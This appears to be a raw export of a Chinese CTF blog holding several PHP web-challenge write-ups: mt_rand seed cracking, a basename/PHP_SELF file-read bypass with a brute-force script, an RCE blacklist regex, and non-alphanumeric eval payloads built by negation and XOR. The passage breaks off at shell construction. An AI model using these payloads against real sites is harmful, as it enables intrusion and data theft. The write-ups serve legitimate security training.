class="string">&quot;#new&quot;</span>).<span class="title function_">empty</span>();</span><br><span class="line"> $(<span class="string">&quot;#div2&quot;</span>).<span class="title function_">empty</span>();</span><br><span class="line">&#125;);</span><br><span class="line">&#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>发现包含了check.php,直接访问得</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">C0WhH1dqUB</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#这不是抽奖程序的源代码！不许看！</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]=<span class="title function_ invoke__">rand</span>(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]);</span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$len1</span>=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++ )&#123;</span><br><span class="line">    <span class="variable">$str</span>.=<span class="title function_ invoke__">substr</span>(<span class="variable">$str_long1</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$str_long1</span>) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str_show</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$str</span>, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.<span class="variable">$str_show</span>.<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]===<span class="variable">$str</span>)&#123;x</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">&quot;check.php&quot;</span>);</span><br></pre></td></tr></table></figure><h4 id="审计源码"><a href="#审计源码" class="headerlink" title="审计源码"></a>审计源码</h4><p>开启会话后，判断session中seed值是否为空，是则用rand函数生成一个值，再将其作为mt_srand()的种子，之后利用$str_long1和随机数生成一串字符，最后截取前10个字符呈现。</p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>由于我们可以通过工具进行爆破出种子，那么我们就可以重复操作得出完整的字符串</p><h4 id="解"><a href="#解" class="headerlink" title="解"></a>解</h4><p>由题目选择，工具的模式（四个参数），前两个是第一次输出区间（即题目给的字符串对应的生成过程中的每个随机数），后两个是输出区间</p><p>生成格式脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pass_now</span> = <span class="string">&quot;TxnDsJjdHq&quot;</span>;</span><br><span class="line"><span class="variable">$allowable_characters</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$length</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$allowable_characters</span>) - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$pass_now</span>); <span class="variable">$j</span>++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$pass_now</span>[<span class="variable">$j</span>] == <span class="variable">$allowable_characters</span>[<span class="variable">$i</span>]) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$i</span> <span class="subst">$i</span> 0 <span class="subst">$length</span> &quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//55 55 0 61 23 23 0 61 13 13 0 61 39 39 0 61 18 18 0 61 45 45 0 61 9 9 0 61 3 3 0 61 43 43 0 61 16 16 0 61 </span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用工具爆破。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">工具下载到Linux中：git clone https://github.com/openwall/php_mt_seed.git  进入目录 make一下，然后使用 </span><br><span class="line">./php_mt_seed 55 55 0 61 23 23 0 61 13 13 0 61 39 39 0 61 18 18 0 61 45 45 0 61 9 9 0 61 3 3 0 61 43 43 0 61 16 16 0 61  后得到不同版本的。</span><br><span class="line">种子得是PHP7.1以上的（找不到哪里显示PHP版本，可能都试一试？）</span><br><span class="line">得到种子：773675551</span><br><span class="line">工具官网（https://www.openwall.com/php_mt_seed/）</span><br></pre></td></tr></table></figure><p>后再用题目脚本来得出字符串</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">773675551</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$len1</span> = <span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$str</span> .= <span class="title function_ invoke__">substr</span>(<span class="variable">$str_long1</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$str_long1</span>) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">&gt;</span><br><span class="line"><span class="comment">//TxnDsJjdHqtrEByP1KYl   （版本也得是7.1以上的）</span></span><br></pre></td></tr></table></figure><p>最后根据题目post一下就有了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 坑 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[Zer0pts2020]Can you guess it?</title>
      <link href="/2023/02/08/Zer0pts2020-Can-you-guess-it/"/>
      <url>/2023/02/08/Zer0pts2020-Can-you-guess-it/</url>
      
        <content type="html"><![CDATA[<p>源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#x27;config.php&#x27;; // FLAG is defined in config.php</span><br><span class="line"></span><br><span class="line">if (preg_match(&#x27;/config\.php\/*$/i&#x27;, $_SERVER[&#x27;PHP_SELF&#x27;])) &#123;</span><br><span class="line">  exit(&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;source&#x27;])) &#123;</span><br><span class="line">  highlight_file(basename($_SERVER[&#x27;PHP_SELF&#x27;]));</span><br><span class="line">  exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$secret = bin2hex(random_bytes(64));</span><br><span class="line">if (isset($_POST[&#x27;guess&#x27;])) &#123;</span><br><span class="line">  $guess = (string) $_POST[&#x27;guess&#x27;];</span><br><span class="line">  if (hash_equals($secret, $guess)) &#123;</span><br><span class="line">    $message = &#x27;Congratulations! The flag is: &#x27; . FLAG;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    $message = &#x27;Wrong.&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Can you guess it?&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Can you guess it?&lt;/h1&gt;</span><br><span class="line">    &lt;p&gt;If your guess is correct, I&#x27;ll give you the flag.&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;&lt;a href=&quot;?source&quot;&gt;Source&lt;/a&gt;&lt;/p&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">&lt;?php if (isset($message)) &#123; ?&gt;</span><br><span class="line">    &lt;p&gt;&lt;?= $message ?&gt;&lt;/p&gt;</span><br><span class="line">&lt;?php &#125; ?&gt;</span><br><span class="line">    &lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;text&quot; name=&quot;guess&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;submit&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$_SERVER[&#x27;PHP_SELF&#x27;]` 表示当前 php 文件相对于网站[根目录]的位置地址，与 document root 相关</span><br><span class="line">下面是本地测试截图，也就是`http://.$_SERVER[&#x27;HTTP_HOST&#x27;].$_SERVER[&#x27;PHP_SELF&#x27;]</span><br><span class="line">即在url输入/index.php/config.php 会触发第一个if语句</span><br><span class="line"></span><br><span class="line">basename() 函数会返回路径中的文件名部分</span><br><span class="line">假如路径是/index.php/config.php</span><br><span class="line">浏览器的解析结果都是index.php</span><br><span class="line">而basename会返回config.php</span><br><span class="line">就算后面跟上多余的字符也会返回文件名部分</span><br><span class="line">如/index.php/config.php/?source返回config.php</span><br><span class="line">basename()会去掉文件名开头的非ASCII值。</span><br><span class="line"></span><br><span class="line">random_bytes(num)生成num个随机的字符，bin2hex(str)将字符转化为十六进制数方便我们观察，这里我就想到会不会是之前做过的一个题目，只要种子一样，随机数其实是定下来的，也就是所谓的伪随机数，这里还有一个比较函数hash_squals，比较两个字符串是否一样</span><br><span class="line">查完发现从这里突破的可能性较小</span><br></pre></td></tr></table></figure><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p>漏洞点：hightlight_file,使路径名解析完是config.php，且绕过第一个if</p><p>绕过第一个if：只要不让解析完config.php是结尾就行,后面加上不可见字符或者其他汉字，中文字符都行——&gt;config.php&#x2F;%ff</p><p>第二个if只需要加上?source就行了</p><p>payload：index.php&#x2F;config.php&#x2F;文?source</p><p>PHP脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">function check($str)</span><br><span class="line">&#123;</span><br><span class="line">    return preg_match(&quot;/config\.php\/*$/i&quot;, $str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for ($i = 0; $i &lt; 255; $i++) &#123;</span><br><span class="line">    $url = &quot;/index.php/config.php/&quot; . chr($i);</span><br><span class="line">    if (!check($url)) &#123;</span><br><span class="line">//       echo &quot;\n&quot;;</span><br><span class="line">//       echo $i.&quot;---&quot;.chr($i).&quot;---&quot;.basename($url);</span><br><span class="line">        if (basename($url) == &quot;config.php&quot;) &#123;</span><br><span class="line">            $furl = &quot;http://756d1e03-c817-450b-af4a-23928b5cbb3c.node4.buuoj.cn:81/index.php/config.php/&quot; . chr($i) . &quot;?source&quot;;</span><br><span class="line">//            echo $furl;</span><br><span class="line">            $html = file_get_contents(&quot;http://756d1e03-c817-450b-af4a-23928b5cbb3c.node4.buuoj.cn:81/index.php/config.php/&quot; . chr($i) . &quot;?source&quot;);</span><br><span class="line">            if (preg_match(&quot;/flag\&#123;.*?\&#125;/&quot;, $html, $flag))</span><br><span class="line">            &#123;</span><br><span class="line">                echo $i.&quot;\n&quot;;</span><br><span class="line">//                echo $html;</span><br><span class="line">//                print_r($flag);</span><br><span class="line">                echo $flag[0];</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考：</p><p><a href="https://blog.csdn.net/solitudi/article/details/108912334">https://blog.csdn.net/solitudi/article/details/108912334</a></p><p><a href="https://www.cnblogs.com/yesec/p/15429527.html">https://www.cnblogs.com/yesec/p/15429527.html</a></p><p><a href="https://blog.csdn.net/qq_54929891/article/details/123662382">https://blog.csdn.net/qq_54929891/article/details/123662382</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[FBCTF2019]RCEService</title>
      <link href="/2023/02/08/FBCTF2019-RCEService/"/>
      <url>/2023/02/08/FBCTF2019-RCEService/</url>
      
        <content type="html"><![CDATA[<p>由wp知，题目是有源码的，但是buu没给</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$json</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_ invoke__">is_string</span>(<span class="variable">$json</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;</span>, <span class="variable">$json</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Attempting to run command:&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$json</span>, <span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$cmd</span> !== <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Invalid input&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="json传值"><a href="#json传值" class="headerlink" title="json传值"></a>json传值</h2><p>json 两个值由题目知一个是cmd ： 先自己试一试  ?cmd&#x3D;{“cmd”:”ls”}</p><p>返回index.php。继续传，发现返回hacking，研究源码。</p><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">putenv(&#x27;PATH=/home/rceservice/jail&#x27;);将环境变量重新设置，导致很多命令就无法像平时那样使用，而是得用绝对路径来使用，一般环境变量是配置到/bin中，其他环境变量有/usr/bin /usr/local/bin等这些中，在这些目录下有集成好的系统命令可以使用。</span><br><span class="line"></span><br><span class="line">Linux命令的位置：/bin,/usr/bin，默认都是全体用户使用，/sbin,/usr/sbin,默认root用户使用</span><br><span class="line"></span><br><span class="line">量词^和$表示匹配头和尾，过滤了很多函数，</span><br><span class="line">[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]</span><br><span class="line">过滤大写字母数字，还有其他字符</span><br></pre></td></tr></table></figure><h2 id="做题"><a href="#做题" class="headerlink" title="做题"></a>做题</h2><h3 id="绕过preg-match"><a href="#绕过preg-match" class="headerlink" title="绕过preg_match"></a>绕过preg_match</h3><h4 id="法一：前后匹配的，这种可以用-0a来绕过"><a href="#法一：前后匹配的，这种可以用-0a来绕过" class="headerlink" title="法一：前后匹配的，这种可以用%0a来绕过"></a>法一：前后匹配的，这种可以用%0a来绕过</h4><p>即</p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
            <tag> 坑 </tag>
            
            <tag> rce </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令执行</title>
      <link href="/2023/02/05/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>/2023/02/05/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<p>PHP</p><p>正则</p><p>学习：<a href="https://blog.csdn.net/kelinfeng16/article/details/82632796">https://blog.csdn.net/kelinfeng16/article/details/82632796</a></p><p>元字符（[] 或者\相关的）、模式修饰符（&#x2F;xxx&#x2F;i  最后面的）、量词（其他）、</p><p>使用反引号运算符”&#96;”的效果与函数shell_exec() 相同。</p><p>注意:<br>关闭了 shell_exec() 时反引号运算符是无效的。<br>与其它某些语言不同，反引号不能在双引号字符串中使用。</p><p><a href="https://blog.csdn.net/superprintf/article/details/111468978">https://blog.csdn.net/superprintf/article/details/111468978</a></p><p><a href="https://blog.csdn.net/qq_41315957/article/details/118855865">https://blog.csdn.net/qq_41315957/article/details/118855865</a></p><p><a href="https://blog.csdn.net/miuzzx/article/details/109143413">https://blog.csdn.net/miuzzx/article/details/109143413</a></p><p><a href="https://cloud.tencent.com/developer/article/1838778">https://cloud.tencent.com/developer/article/1838778</a></p><p><a href="https://blog.csdn.net/mochu7777777/article/details/104631142">https://blog.csdn.net/mochu7777777/article/details/104631142</a></p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p><p><a href="https://xz.aliyun.com/t/8107#toc-11">https://xz.aliyun.com/t/8107#toc-11</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>[极客大挑战 2019]RCE ME</title>
      <link href="/2023/02/04/rceME/"/>
      <url>/2023/02/04/rceME/</url>
      
        <content type="html"><![CDATA[<h4 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;This is too Long.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>过滤字母，数字，考虑url编码取反绕过、异或绕过（都是任意PHP版本适用）</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p><a href="https://blog.csdn.net/mochu7777777/article/details/104631142">https://blog.csdn.net/mochu7777777/article/details/104631142</a></p><p>简单来说就是</p><p>异或绕过：未被禁用的字符异或后得到想要的字符，然后用.运算符拼接起来从而绕过。</p><p>url编码取反绕过：一些字符取反后可以得到想要的字符，但是这些字符通常是不可见的，所以要用URL编码一下才好编写payload。</p><p>PHP7特性：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">phpinfo() php5/7都可执行</span><br><span class="line">(phpinfo)() php7可执行</span><br><span class="line"></span><br><span class="line">php7支持$&#123;&#125;这种格式。$&#123;&#x27;GET&#x27;&#125;=$GET</span><br></pre></td></tr></table></figure><h4 id="做题"><a href="#做题" class="headerlink" title="做题"></a>做题</h4><p>先利用PHPinfo查看，禁用函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?code=(~%8F%97%8F%96%91%99%90)();  //(phpinfo)();</span><br><span class="line">?code=(&#x27;%0b%08%0b%09%0e%06%0f&#x27;^&#x27;%7b%60%7b%60%60%60%60&#x27;)();//(phpinfo)();</span><br></pre></td></tr></table></figure><h5 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h5><p>由于是@eval($code);</p><p>我们传入   ?code&#x3D;(~%8F%97%8F%96%91%99%90)();   的时候对于PHP，形如 (func_name)()，其中func_name可以是字符串，会执行这个func</p><p>若是整个phpinfo()全部编码，则不会执行，因为PHP还没取反前不知道传入的是可以执行的，所以PHP先取反后不会执行。</p><p>补充：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">既然可以构造函数。那么也可以构造readfile/scandir这种,一些简单的题。直接看flag</span><br><span class="line">(~%89%9E%8D%A0%9B%8A%92%8F)=var_dump</span><br><span class="line">(~%8C%9C%9E%91%9B%96%8D)=scandir</span><br><span class="line">(~%89%9E%8D%A0%9B%8A%92%8F)((~%8C%9C%9E%91%9B%96%8D)(%27./%27));</span><br><span class="line">var_dump(scandir(&#x27;./&#x27;))</span><br><span class="line">如果./也被过滤。一样。通过~取反获得</span><br><span class="line">注意(~%D1%D0)=./     带括号的编码才等于字符串。</span><br></pre></td></tr></table></figure><h5 id="构造shell"><a href="#构造shell" class="headerlink" title="构造shell"></a>构造shell</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 